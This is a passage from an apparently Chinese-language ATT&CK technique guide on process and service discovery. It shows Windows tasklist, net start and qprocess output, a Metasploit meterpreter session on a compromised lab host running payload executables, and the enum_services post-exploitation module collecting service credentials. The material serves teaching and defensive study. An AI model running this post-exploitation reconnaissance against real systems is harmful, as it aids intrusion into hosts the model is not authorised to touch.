<p>net start</p>
</blockquote>
<blockquote>
<p>qprocess *</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> tasklist /svc

映像名称                       PID 服务
========================= ======== ============================================
System Idle Process              0 暂缺
System                           4 暂缺
Registry                        88 暂缺
smss.exe                       296 暂缺
csrss.exe                      396 暂缺
wininit.exe                    496 暂缺
csrss.exe                      508 暂缺
winlogon.exe                   588 暂缺
services.exe                   604 暂缺
lsass.exe                      632 KeyIso, SamSs
svchost.exe                    732 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                744 暂缺
fontdrvhost.exe                812 暂缺
svchost.exe                    860 RpcEptMapper, RpcSs
svchost.exe                    904 LSM
dwm.exe                       1000 暂缺
svchost.exe                    376 TermService
svchost.exe                    656 CoreMessagingRegistrar
svchost.exe                    808 lmhosts
svchost.exe                   1120 NcbService
svchost.exe                   1136 Schedule
svchost.exe                   1176 ProfSvc
svchost.exe                   1248 EventLog
svchost.exe                   1300 UserManager
svchost.exe                   1332 nsi
svchost.exe                   1348 UmRdpService
svchost.exe                   1420 TimeBrokerSvc
svchost.exe                   1444 Dhcp
svchost.exe                   1512 CertPropSvc
svchost.exe                   1548 EventSystem
svchost.exe                   1580 SysMain
svchost.exe                   1616 Themes
Memory Compression            1716 暂缺
WUDFHost.exe                  1736 暂缺
svchost.exe                   1792 LanmanWorkstation
svchost.exe                   1812 SENS
svchost.exe                   1844 NlaSvc
svchost.exe                   1892 AudioEndpointBuilder
svchost.exe                   1916 FontCache
svchost.exe                   2028 SessionEnv
svchost.exe                   2036 Audiosrv
svchost.exe                   2064 netprofm
svchost.exe                   2204 Dnscache
svchost.exe                   2220 DusmSvc
svchost.exe                   2240 Wcmsvc
svchost.exe                   2276 StateRepository
svchost.exe                   2504 WlanSvc
svchost.exe                   2544 ShellHWDetection
spoolsv.exe                   2612 Spooler
svchost.exe                   2648 BFE, mpssvc
svchost.exe                   2772 IKEEXT
svchost.exe                   2784 PolicyAgent
wvs_supervisor.exe            2844 Acunetix
pg_ctl.exe                    2852 Acunetix Database
svchost.exe                   2860 CryptSvc
svchost.exe                   2884 DPS
FNPLicensingService.exe       2900 FlexNet Licensing Service
svchost.exe                   2928 Winmgmt
svchost.exe                   2988 LPDSVC
svchost.exe                   3016 LanmanServer
svchost.exe                   1656 SstpSvc
vmtoolsd.exe                  2364 VMTools
svchost.exe                   2312 TrkWks
sv_service.exe                 236 VOneMgrSvcForNG
svchost.exe                   2740 WpnService
svchost.exe                   3236 WdiServiceHost
svchost.exe                   3260 iphlpsvc
opsrv.exe                     3416 暂缺
svchost.exe                   3448 RasMan
postgres.exe                  3456 暂缺
conhost.exe                   3464 暂缺
conhost.exe                   3516 暂缺
dllhost.exe                   3976 COMSysApp
postgres.exe                   644 暂缺
postgres.exe                  2892 暂缺
postgres.exe                   660 暂缺
postgres.exe                  2920 暂缺
postgres.exe                  2880 暂缺
msdtc.exe                     4256 MSDTC
svchost.exe                   4972 CDPUserSvc_56a0b
sihost.exe                    4988 暂缺
svchost.exe                   5012 WpnUserService_56a0b
taskhostw.exe                 5088 暂缺
svchost.exe                   5116 TokenBroker
svchost.exe                   4452 TabletInputService
svchost.exe                     64 CDPSvc
ctfmon.exe                    4732 暂缺
svchost.exe                   1904 PcaSvc
explorer.exe                  5188 暂缺
svchost.exe                   5616 cbdhsvc_56a0b
sv_websvr.exe                 5712 暂缺
ShellExperienceHost.exe       5844 暂缺
RuntimeBroker.exe             6016 暂缺
WindowsInternal.Composabl     5184 暂缺
vmtoolsd.exe                  4816 暂缺
jusched.exe                    328 暂缺
AttackView.exe                5992 暂缺
svchost.exe                   2268 SSDPSRV
powershell.exe                1272 暂缺
conhost.exe                   3816 暂缺
svchost.exe                   4400 LicenseManager
svchost.exe                   4548 DsSvc
svchost.exe                   2228 StorSvc
WmiPrvSE.exe                  3944 暂缺
postgres.exe                  1364 暂缺
postgres.exe                  4520 暂缺
postgres.exe                  4488 暂缺
postgres.exe                  3392 暂缺
svchost.exe                   2212 BITS
svchost.exe                   4656 WinHttpAutoProxySvc
WmiPrvSE.exe                  6588 暂缺
tasklist.exe                  6920 暂缺

PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> net start
已经启动以下 Windows 服务:

   Acunetix
   Acunetix Database
   Background Tasks Infrastructure Service
   Base Filtering Engine
   Certificate Propagation
   CNG Key Isolation
   COM+ Event System
   COM+ System Application
   CoreMessaging
   Cryptographic Services
   Data Sharing Service
   DCOM Server Process Launcher
   DHCP Client
   Diagnostic Policy Service
   Diagnostic Service Host
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   FlexNet Licensing Service
   IKE and AuthIP IPsec Keying Modules
   IP Helper
   IPsec Policy Agent
   Local Session Manager
   LPD Service
   Network Connection Broker
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Power
   Print Spooler
   Program Compatibility Assistant Service
   Remote Access Connection Manager
   Remote Desktop Configuration
   Remote Desktop Services
   Remote Desktop Services UserMode Port Redirector
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Secure Socket Tunneling Protocol Service
   Security Accounts Manager
   Server
   Shell Hardware Detection
   SSDP Discovery
   SSL VPN Management Service Program For NG
   State Repository Service
   Storage Service
   SysMain
   System Event Notification Service
   System Events Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   Time Broker
   Touch Keyboard and Handwriting Panel Service
   User Manager
   User Profile Service
   VMware Tools
   Web 帐户管理器
   Windows Audio
   Windows Audio Endpoint Builder
   Windows Connection Manager
   Windows Defender Firewall
   Windows Event Log
   Windows Font Cache Service
   Windows Management Instrumentation
   Windows Push Notifications User Service_56a0b
   Windows 推送通知系统服务
   Windows 许可证管理器服务
   WinHTTP Web Proxy Auto-Discovery Service
   WLAN AutoConfig
   Workstation
   剪贴板用户服务_56a0b
   数据使用量
   连接设备平台服务
   连接设备平台用户服务_56a0b

命令成功完成。


PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> qprocess <span class="pl-k">*</span>
 用户名                会话名              ID    PID  映像
 (未知)                services             0      0
 (未知)                services             0      4  system
 system                services             0     88  registry
 system                services             0    296  smss.exe
 system                services             0    396  csrss.exe
 system                services             0    496  wininit.exe
<span class="pl-k">&gt;</span>system                console              1    508  csrss.exe
<span class="pl-k">&gt;</span>system                console              1    588  winlogon.exe
 system                services             0    604  services.exe
 system                services             0    632  lsass.exe
 system                services             0    732  svchost.exe
 umfd-0                services             0    744  fontdrvhost.ex
<span class="pl-k">&gt;</span>umfd-1                console              1    812  fontdrvhost.ex
 network service       services             0    860  svchost.exe
 system                services             0    904  svchost.exe
<span class="pl-k">&gt;</span>dwm-1                 console              1   1000  dwm.exe
 network service       services             0    376  svchost.exe
 <span class="pl-k">local</span> service         services             0    656  svchost.exe
 <span class="pl-k">local</span> service         services             0    808  svchost.exe
 system                services             0   1120  svchost.exe
 system                services             0   1136  svchost.exe
 system                services             0   1176  svchost.exe
 <span class="pl-k">local</span> service         services             0   1248  svchost.exe
 system                services             0   1300  svchost.exe
 <span class="pl-k">local</span> service         services             0   1332  svchost.exe
 system                services             0   1348  svchost.exe
 <span class="pl-k">local</span> service         services             0   1420  svchost.exe
 <span class="pl-k">local</span> service         services             0   1444  svchost.exe
 system                services             0   1512  svchost.exe
 <span class="pl-k">local</span> service         services             0   1548  svchost.exe
 system                services             0   1580  svchost.exe
 system                services             0   1616  svchost.exe
 system                services             0   1716  memory compr..
 <span class="pl-k">local</span> service         services             0   1736  wudfhost.exe
 network service       services             0   1792  svchost.exe
 system                services             0   1812  svchost.exe
 network service       services             0   1844  svchost.exe
 system                services             0   1892  svchost.exe
 <span class="pl-k">local</span> service         services             0   1916  svchost.exe
 system                services             0   2028  svchost.exe
 <span class="pl-k">local</span> service         services             0   2036  svchost.exe
 <span class="pl-k">local</span> service         services             0   2064  svchost.exe
 network service       services             0   2204  svchost.exe
 <span class="pl-k">local</span> service         services             0   2220  svchost.exe
 <span class="pl-k">local</span> service         services             0   2240  svchost.exe
 system                services             0   2276  svchost.exe
 system                services             0   2504  svchost.exe
 system                services             0   2544  svchost.exe
 system                services             0   2612  spoolsv.exe
 <span class="pl-k">local</span> service         services             0   2648  svchost.exe
 system                services             0   2772  svchost.exe
 network service       services             0   2784  svchost.exe
 system                services             0   2844  wvs_supervis..
 <span class="pl-k">local</span> service         services             0   2852  pg_ctl.exe
 network service       services             0   2860  svchost.exe
 <span class="pl-k">local</span> service         services             0   2884  svchost.exe
 system                services             0   2900  fnplicensing..
 system                services             0   2928  svchost.exe
 system                services             0   2988  svchost.exe
 system                services             0   3016  svchost.exe
 <span class="pl-k">local</span> service         services             0   1656  svchost.exe
 system                services             0   2364  vmtoolsd.exe
 system                services             0   2312  svchost.exe
 system                services             0    236  sv_service.exe
 system                services             0   2740  svchost.exe
 <span class="pl-k">local</span> service         services             0   3236  svchost.exe
 system                services             0   3260  svchost.exe
 system                services             0   3416  opsrv.exe
 system                services             0   3448  svchost.exe
 <span class="pl-k">local</span> service         services             0   3456  postgres.exe
 system                services             0   3464  conhost.exe
 <span class="pl-k">local</span> service         services             0   3516  conhost.exe
 system                services             0   3976  dllhost.exe
 <span class="pl-k">local</span> service         services             0    644  postgres.exe
 <span class="pl-k">local</span> service         services             0   2892  postgres.exe
 <span class="pl-k">local</span> service         services             0    660  postgres.exe
 <span class="pl-k">local</span> service         services             0   2920  postgres.exe
 <span class="pl-k">local</span> service         services             0   2880  postgres.exe
 network service       services             0   4256  msdtc.exe
<span class="pl-k">&gt;</span>administrator         console              1   4972  svchost.exe
<span class="pl-k">&gt;</span>administrator         console              1   4988  sihost.exe
<span class="pl-k">&gt;</span>administrator         console              1   5012  svchost.exe
<span class="pl-k">&gt;</span>administrator         console              1   5088  taskhostw.exe
 system                services             0   5116  svchost.exe
 system                services             0   4452  svchost.exe
 <span class="pl-k">local</span> service         services             0     64  svchost.exe
<span class="pl-k">&gt;</span>administrator         console              1   4732  ctfmon.exe
 system                services             0   1904  svchost.exe
<span class="pl-k">&gt;</span>administrator         console              1   5188  explorer.exe
<span class="pl-k">&gt;</span>administrator         console              1   5616  svchost.exe
<span class="pl-k">&gt;</span>administrator         console              1   5712  sv_websvr.exe
<span class="pl-k">&gt;</span>administrator         console              1   5844  shellexperie..
<span class="pl-k">&gt;</span>administrator         console              1   6016  runtimebroke..
<span class="pl-k">&gt;</span>administrator         console              1   5184  windowsinter..
<span class="pl-k">&gt;</span>administrator         console              1   4816  vmtoolsd.exe
<span class="pl-k">&gt;</span>administrator         console              1   5992  attackview.exe
 <span class="pl-k">local</span> service         services             0   2268  svchost.exe
<span class="pl-k">&gt;</span>administrator         console              1   1272  powershell.exe
<span class="pl-k">&gt;</span>administrator         console              1   3816  conhost.exe
 <span class="pl-k">local</span> service         services             0   4400  svchost.exe
 system                services             0   4548  svchost.exe
 system                services             0   2228  svchost.exe
 system                services             0   3944  wmiprvse.exe
 <span class="pl-k">local</span> service         services             0   1364  postgres.exe
 <span class="pl-k">local</span> service         services             0   4520  postgres.exe
 <span class="pl-k">local</span> service         services             0   4488  postgres.exe
 <span class="pl-k">local</span> service         services             0   3392  postgres.exe
 <span class="pl-k">local</span> service         services             0   4656  svchost.exe
 network service       services             0   6588  wmiprvse.exe
 <span class="pl-k">local</span> service         services             0   2528  audiodg.exe
<span class="pl-k">&gt;</span>administrator         console              1    260  qprocess.exe</pre></div>
<h4><a id="user-content-msf下操作-15" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-15"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>ps</p>
<p>post/windows/gather/enum_services</p>
</blockquote>
<pre><code>meterpreter &gt; ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                           Path
 ---   ----  ----                     ----  -------  ----                           ----
 0     0     [System Process]                                                       
 4     0     System                   x86   0                                       
 264   4     smss.exe                 x86   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe
 312   264   csrss.exe                x86   0        NT AUTHORITY\SYSTEM            \??\C:\WINDOWS\system32\csrss.exe
 340   264   winlogon.exe             x86   0        NT AUTHORITY\SYSTEM            \??\C:\WINDOWS\system32\winlogon.exe
 388   340   services.exe             x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\services.exe
 400   340   lsass.exe                x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\lsass.exe
 572   1436  payload1.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\Documents and Settings\Administrator\����\payload1.exe
 592   388   vmacthlp.exe             x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 608   388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\svchost.exe
 688   388   svchost.exe              x86   0                                       C:\WINDOWS\system32\svchost.exe
 748   388   svchost.exe              x86   0                                       C:\WINDOWS\system32\svchost.exe
 800   388   svchost.exe              x86   0                                       C:\WINDOWS\system32\svchost.exe
 816   388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
 912   3424  TPAutoConnect.exe        x86   0        ROOT-5DE52AC98B\Administrator  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 956   388   spoolsv.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\spoolsv.exe
 984   388   msdtc.exe                x86   0                                       C:\WINDOWS\system32\msdtc.exe
 1100  388   httpd.exe                x86   0        NT AUTHORITY\SYSTEM            C:\phpStudy\PHPTutorial\Apache\bin\httpd.exe
 1144  388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
 1200  388   inetinfo.exe             x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\inetsrv\inetinfo.exe
 1228  388   mysqld.exe               x86   0        NT AUTHORITY\SYSTEM            C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe
 1252  388   mysqld.exe               x86   0        NT AUTHORITY\SYSTEM            C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe
 1320  168   conime.exe               x86   0        ROOT-5DE52AC98B\Administrator  C:\WINDOWS\system32\conime.exe
 1328  388   svchost.exe              x86   0                                       C:\WINDOWS\system32\svchost.exe
 1348  3424  TPAutoConnect.exe        x86   0        ROOT-5DE52AC98B\Administrator  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 1352  388   SafeDogUpdateCenter.exe  x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\SafeDog\SafeDogUpdateCenter\SafeDogUpdateCenter.exe
 1436  1168  explorer.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\WINDOWS\Explorer.EXE
 1440  388   CloudHelper.exe          x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\SafeDog\SafeDogUpdateCenter\CloudHelper.exe
 1468  1436  ctfmon.exe               x86   0        ROOT-5DE52AC98B\Administrator  C:\WINDOWS\system32\ctfmon.exe
 1804  388   VGAuthService.exe        x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1856  388   vmtoolsd.exe             x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1932  388   mqsvc.exe                x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\mqsvc.exe
 2072  388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
 2248  1100  httpd.exe                x86   0        NT AUTHORITY\SYSTEM            C:\phpStudy\PHPTutorial\Apache\bin\httpd.exe
 2264  1436  vmtoolsd.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2904  608   wmiprvse.exe             x86   0                                       C:\WINDOWS\system32\wbem\wmiprvse.exe
 3196  608   wmiprvse.exe             x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\wbem\wmiprvse.exe
 3368  388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
 3408  1436  artifact.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\Documents and Settings\Administrator\����\artifact.exe
 3424  388   TPAutoConnSvc.exe        x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 3520  388   dllhost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\dllhost.exe
 3600  1436  artifact.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\Documents and Settings\Administrator\����\artifact.exe
 3876  340   logon.scr                x86   0        ROOT-5DE52AC98B\Administrator  C:\WINDOWS\System32\logon.scr

msf5 post(windows/gather/enum_logged_on_users) &gt; use post/windows/gather/enum_services 
msf5 post(windows/gather/enum_services) &gt; set session 1
session =&gt; 1
msf5 post(windows/gather/enum_services) &gt; exploit 

[*] Listing Service Info for matching services, please wait...
[+] New service credential detected: AeLookupSvc is running as 'LocalSystem'
[+] New service credential detected: Alerter is running as 'NT AUTHORITY\LocalService'
[+] New service credential detected: aspnet_state is running as 'NT AUTHORITY\NetworkService'
Services
========

 Name                                 Credentials                  Command   Startup
 ----                                 -----------                  -------   -------
 ALG                                  NT AUTHORITY\LocalService    Manual    C:\WINDOWS\System32\alg.exe
 AeLookupSvc                          LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 Alerter                              NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\svchost.exe -k LocalService
 Apache2                              LocalSystem                  Auto      "C:\phpstudy0\Apache\bin\httpd.exe" -k runservice
 AppMgmt                              LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 AudioSrv                             LocalSystem                  Disabled  C:\WINDOWS\System32\svchost.exe -k netsvcs
 BITS                                 LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 Browser                              LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 COMSysApp                            LocalSystem                  Manual    C:\WINDOWS\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
 CiSvc                                LocalSystem                  Disabled  C:\WINDOWS\system32\cisvc.exe
 ClipSrv                              LocalSystem                  Disabled  C:\WINDOWS\system32\clipsrv.exe
 CryptSvc                             LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 DcomLaunch                           LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k DcomLaunch
 Dfs                                  LocalSystem                  Manual    C:\WINDOWS\system32\Dfssvc.exe
 Dhcp                                 NT AUTHORITY\NetworkService  Auto      C:\WINDOWS\system32\svchost.exe -k NetworkService
 Dnscache                             NT AUTHORITY\NetworkService  Auto      C:\WINDOWS\system32\svchost.exe -k NetworkService
 ERSvc                                LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k WinErr
 EventSystem                          LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 Eventlog                             LocalSystem                  Auto      C:\WINDOWS\system32\services.exe
 HTTPFilter                           LocalSystem                  Manual    C:\WINDOWS\system32\lsass.exe
 HidServ                              LocalSystem                  Disabled  C:\WINDOWS\System32\svchost.exe -k netsvcs
 IISADMIN                             LocalSystem                  Auto      C:\WINDOWS\system32\inetsrv\inetinfo.exe
 ImapiService                         LocalSystem                  Disabled  C:\WINDOWS\system32\imapi.exe
 IsmServ                              LocalSystem                  Disabled  C:\WINDOWS\System32\ismserv.exe
 LicenseService                       NT AUTHORITY\NetworkService  Disabled  C:\WINDOWS\System32\llssrv.exe
 LmHosts                              NT AUTHORITY\LocalService    Auto      C:\WINDOWS\system32\svchost.exe -k LocalService
 MSDTC                                NT AUTHORITY\NetworkService  Auto      C:\WINDOWS\system32\msdtc.exe
 MSIServer                            LocalSystem                  Manual    C:\WINDOWS\system32\msiexec.exe /V
 MSMQ                                 LocalSystem                  Auto      C:\WINDOWS\system32\mqsvc.exe
 Messenger                            LocalSystem                  Disabled  C:\WINDOWS\system32\svchost.exe -k netsvcs
 MySQL                                LocalSystem                  Auto      C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe MySQL
 MySQLa                               LocalSystem                  Auto      C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe MySQLa
 NetDDE                               LocalSystem                  Disabled  C:\WINDOWS\system32\netdde.exe
 NetDDEdsdm                           LocalSystem                  Disabled  C:\WINDOWS\system32\netdde.exe
 Netlogon                             LocalSystem                  Manual    C:\WINDOWS\system32\lsass.exe
 Netman                               LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs
 Nla                                  LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 NtFrs                                LocalSystem                  Manual    C:\WINDOWS\system32\ntfrs.exe
 NtLmSsp                              LocalSystem                  Manual    C:\WINDOWS\system32\lsass.exe
 NtmsSvc                              LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 PlugPlay                             LocalSystem                  Auto      C:\WINDOWS\system32\services.exe
 PolicyAgent                          LocalSystem                  Auto      C:\WINDOWS\system32\lsass.exe
 ProtectedStorage                     LocalSystem                  Auto      C:\WINDOWS\system32\lsass.exe
 RDSessMgr                            LocalSystem                  Manual    C:\WINDOWS\system32\sessmgr.exe
 RSoPProv                             LocalSystem                  Manual    C:\WINDOWS\system32\RSoPProv.exe
 RasAuto                              LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 RasMan                               LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 RemoteAccess                         LocalSystem                  Disabled  C:\WINDOWS\system32\svchost.exe -k netsvcs
 RemoteRegistry                       NT AUTHORITY\LocalService    Auto      C:\WINDOWS\system32\svchost.exe -k regsvc
 RpcLocator                           NT AUTHORITY\NetworkService  Manual    C:\WINDOWS\system32\locator.exe
 RpcSs                                NT AUTHORITY\NetworkService  Auto      C:\WINDOWS\system32\svchost.exe -k rpcss
 SCardSvr                             NT AUTHORITY\LocalService    Manual    C:\WINDOWS\System32\SCardSvr.exe
 SENS                                 LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 SafeDogCloudHelper                   LocalSystem                  Auto      "C:\Program Files\SafeDog\SafeDogUpdateCenter\CloudHelper.exe"
 Safedog Update Center                LocalSystem                  Auto      "C:\Program Files\SafeDog\SafeDogUpdateCenter\SafeDogUpdateCenter.exe"
 SamSs                                LocalSystem                  Auto      C:\WINDOWS\system32\lsass.exe
 Schedule                             LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 SharedAccess                         LocalSystem                  Disabled  C:\WINDOWS\system32\svchost.exe -k netsvcs
 ShellHWDetection                     LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 Spooler                              LocalSystem                  Auto      C:\WINDOWS\system32\spoolsv.exe
 SysmonLog                            NT Authority\NetworkService  Auto      C:\WINDOWS\system32\smlogsvc.exe
 TPAutoConnSvc                        LocalSystem                  Manual    "C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe"
 TPVCGateway                          LocalSystem                  Manual    "C:\Program Files\VMware\VMware Tools\TPVCGateway.exe"
 TapiSrv                              LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k tapisrv
 TermService                          LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k termsvcs
 Themes                               LocalSystem                  Disabled  C:\WINDOWS\System32\svchost.exe -k netsvcs
 TlntSvr                              NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\tlntsvr.exe
 TrkSvr                               LocalSystem                  Disabled  C:\WINDOWS\system32\svchost.exe -k netsvcs
 TrkWks                               LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 Tssdis                               LocalSystem                  Disabled  C:\WINDOWS\System32\tssdis.exe
 UMWdf                                NT AUTHORITY\LocalService    Manual    C:\WINDOWS\system32\wdfmgr.exe
 UPS                                  NT AUTHORITY\LocalService    Manual    C:\WINDOWS\System32\ups.exe
 VGAuthService                        LocalSystem                  Auto      "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
 VMTools                              LocalSystem                  Auto      "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
 VMware Physical Disk Helper Service  LocalSystem                  Auto      "C:\Program Files\VMware\VMware Tools\vmacthlp.exe"
 VSS                                  LocalSystem                  Manual    C:\WINDOWS\System32\vssvc.exe
 W32Time                              NT AUTHORITY\LocalService    Auto      C:\WINDOWS\System32\svchost.exe -k LocalService
 W3SVC                                LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k iissvcs
 WZCSVC                               LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 WebClient                            NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\svchost.exe -k LocalService
 WinHttpAutoProxySvc                  NT AUTHORITY\LocalService    Manual    C:\WINDOWS\system32\svchost.exe -k LocalService
 WmdmPmSN                             LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs
 Wmi                                  LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs
 WmiApSrv                             LocalSystem                  Manual    C:\WINDOWS\system32\wbem\wmiapsrv.exe
 apache                               LocalSystem                  Auto      "C:\phpStudy\PHPTutorial\Apache\bin\httpd.exe" -k runservice
 aspnet_state                         NT AUTHORITY\NetworkService  Manual    C:\WINDOWS\Microsoft.NET\Framework\v1.1.4322\aspnet_state.exe
 dmadmin                              LocalSystem                  Manual    C:\WINDOWS\System32\dmadmin.exe /com
 dmserver                             LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 helpsvc                              LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 kdc                                  LocalSystem                  Disabled  C:\WINDOWS\System32\lsass.exe
 lanmanserver                         LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 lanmanworkstation                    LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 mnmsrvc                              LocalSystem                  Disabled  C:\WINDOWS\system32\mnmsrvc.exe
 sacsvr                               LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs
 seclogon                             LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 stisvc                               NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\svchost.exe -k imgsvc
 swprv                                LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k swprv
 vds                                  LocalSystem                  Manual    C:\WINDOWS\System32\vds.exe
 vmvss                                LocalSystem                  Manual    C:\WINDOWS\system32\dllhost.exe /Processid:{64F3ADCF-113F-4FD8-B7EE-76884E9E75E6}
 winmgmt                              LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 wuauserv                             LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 xmlprov                              LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs

[+] Loot file stored in: /root/.msf4/loot/20190907144835_default_192.168.2.114_windows.services_639665.txt
[*] Post module execution completed

</code></pre>
<h4><a id="user-content-cs下操作-20" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-20"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>explore  -- &gt;  process list</p>
</blockquote>
